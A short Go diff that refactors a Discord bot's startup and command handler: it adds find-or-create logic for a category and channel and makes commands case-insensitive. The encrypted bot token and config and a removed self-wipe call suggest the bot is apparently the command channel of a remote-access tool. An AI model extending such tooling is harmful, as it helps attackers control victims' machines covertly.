@@ -30,8 +30,7 @@ func Start() {
 
 	bot, err := discordgo.New("Bot " + higher.DecryptConfig(store.BOT_TOKEN))
 	if err != nil {
-		utils.DebugLog(fmt.Sprintf("failed to create bot - %v", err))
-		funcs.Wipe(false) // this will literally never fail
+		cannotConnect("failed to create bot", err) // this will literally never fail
 		return
 	}
 
@@ -59,16 +58,16 @@ func Start() {
 
 	categoryID := higher.DecryptConfig(store.CATEGORY_ID)
 	if categoryID == "" {
-		categoryID, err = discord.FindCategory(bot)
+		categoryID, err = discord.FindOrCreateFallbackCategory(bot)
 		if err != nil {
-			cannotConnect("failed to find category", err)
+			cannotConnect("failed to find or create fallback category", err)
 			return
 		}
 	}
 
-	channelID, new, err := discord.FindChannel(bot, categoryID)
+	channelID, new, err := discord.FindOrCreateChannel(bot, categoryID)
 	if err != nil {
-		cannotConnect("failed to find category", err)
+		cannotConnect("failed to find or create channel", err)
 		return
 	}
 
@@ -131,7 +130,7 @@ func handler(ses *discordgo.Session, msg *discordgo.MessageCreate) {
 		return
 	}
 
-	if name == "list" {
+	if strings.ToLower(name) == "list" {
 		link := fmt.Sprintf(
 			"https://discord.com/channels/%s/%s",
 			store.DecryptedServerID,
@@ -146,7 +145,7 @@ func handler(ses *discordgo.Session, msg *discordgo.MessageCreate) {
 		return
 	}
 
-	if name == "help" {
+	if strings.ToLower(name) == "help" {
 		var help strings.Builder
 
 		help.WriteString("**Commands:**\n```\n")
